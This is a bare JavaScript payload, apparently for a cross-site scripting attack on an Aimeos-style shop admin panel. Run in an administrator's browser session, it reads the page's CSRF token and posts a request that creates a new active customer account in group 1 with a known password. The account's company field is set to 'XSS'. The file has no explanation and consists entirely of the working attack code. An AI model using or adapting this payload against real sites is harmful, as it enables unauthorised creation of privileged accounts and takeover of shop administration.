var http = new XMLHttpRequest();
var url = '/admin/default/jqadm/save/customer?locale=en';
var params ="item[customer.id]=&next=get&item[customer.status]=1&item[customer.code]=fromconsolefinal@test.com&item[customer.password]=1234567&item[customer.groups][]=1&item[customer.languageid]=en&item[customer.lastname]=lastname&item[customer.firstname]=pepe&item[customer.city]=DR&item[customer.countryid]=AF&item[customer.email]=fromconsolefinal@test.com&item[customer.company]=XSS&uo[filter][key][1]=order.id&uo[filter][op][1]=%3d%3d&_token=" + document.getElementsByTagName("input")[0].value ;
http.open('POST', url, true);
http.withCredentials = true
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
        console.log("Got it:" + http.status);
    }
}
http.send(params);
